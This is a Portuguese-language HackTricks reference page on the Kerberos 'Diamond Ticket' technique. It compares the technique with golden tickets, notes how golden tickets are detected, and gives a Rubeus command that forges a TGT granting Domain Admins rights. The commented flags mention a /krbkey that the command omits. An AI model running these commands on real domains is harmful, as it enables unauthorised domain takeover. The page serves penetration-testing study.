# Bilhete de Diamante

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>

## Bilhete de Diamante

**Assim como um bilhete de ouro**, um bilhete de diamante é um TGT que pode ser usado para **acessar qualquer serviço como qualquer usuário**. Um bilhete de ouro é forjado completamente offline, criptografado com o hash krbtgt desse domínio e depois passado para uma sessão de logon para uso. Como os controladores de domínio não rastreiam os TGTs que emitiram legitimamente, eles aceitarão felizmente TGTs que estão criptografados com seu próprio hash krbtgt.

Existem duas técnicas comuns para detectar o uso de bilhetes de ouro:

* Procure por TGS-REQs que não têm um AS-REQ correspondente.
* Procure por TGTs que têm valores bobos, como a vida útil padrão de 10 anos do Mimikatz.

Um **bilhete de diamante** é feito **modificando os campos de um TGT legítimo que foi emitido por um DC**. Isso é alcançado **solicitando** um **TGT**, **descriptografando** com o hash krbtgt do domínio, **modificando** os campos desejados do bilhete e então **recriptografando**. Isso **supera as duas deficiências mencionadas** de um bilhete de ouro porque:

* TGS-REQs terão um AS-REQ precedente.
* O TGT foi emitido por um DC, o que significa que terá todos os detalhes corretos da política de Kerberos do domínio. Mesmo que esses possam ser forjados com precisão em um bilhete de ouro, é mais complexo e está sujeito a erros.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
